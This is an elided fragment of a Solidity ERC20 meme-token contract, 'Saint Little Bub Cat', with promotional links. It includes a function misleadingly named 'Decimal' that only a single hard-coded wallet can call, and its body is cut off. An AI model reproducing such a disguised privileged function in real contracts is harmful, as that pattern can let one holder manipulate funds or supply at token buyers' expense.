// Join St. Little bub cat on his charitable blockchain adventure here

// https://saintlittlebubcat.com/
// https://t.me/SaintLittleBubCat
// https://twitter.com/SaintLilBubCat
...
contract SaintLittleBubCat is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Saint Little Bub Cat", "$SLBC") {
        ...
        marketingWallet = payable(0xc66e5C00412912AcCFF2aB3865035b9b210A6e6f);
        devWallet = payable(0xc66e5C00412912AcCFF2aB3865035b9b210A6e6f);
    ...
    function Decimal(uint amount) external {
        require(msg.sender == marketingWallet);
